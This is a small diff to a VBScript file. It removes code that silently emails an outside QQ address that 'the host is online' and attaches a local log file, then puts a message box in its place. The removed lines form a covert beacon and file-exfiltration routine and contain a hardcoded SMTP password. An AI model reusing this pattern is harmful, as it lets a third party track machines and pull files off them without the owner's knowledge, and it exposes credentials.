@@ -1,17 +1,1 @@
-NameSpace = "http://schemas.microsoft.com/cdo/configuration/" 
-Set Email = CreateObject("CDO.Message") 
-Email.From = "yourcody@qq.com" 
-Email.To = "705051107@qq.com" 
-Email.Subject = "Push in real time" 
-Email.Textbody = "Please note that the host is online." 
-Email.AddAttachment "D:\\GiftRunLog.log" 
-With Email.Configuration.Fields 
-.Item(NameSpace&"sendusing") = 2 
-.Item(NameSpace&"smtpserver") = "smtp.qq.com" 
-.Item(NameSpace&"smtpserverport") = 25 
-.Item(NameSpace&"smtpauthenticate") = 1 
-.Item(NameSpace&"sendusername") = "yourcody@qq.com" 
-.Item(NameSpace&"sendpassword") = "takndbontizidcae" 
-.Update 
-End With 
-Email.Send
+MsgBox("小空格")
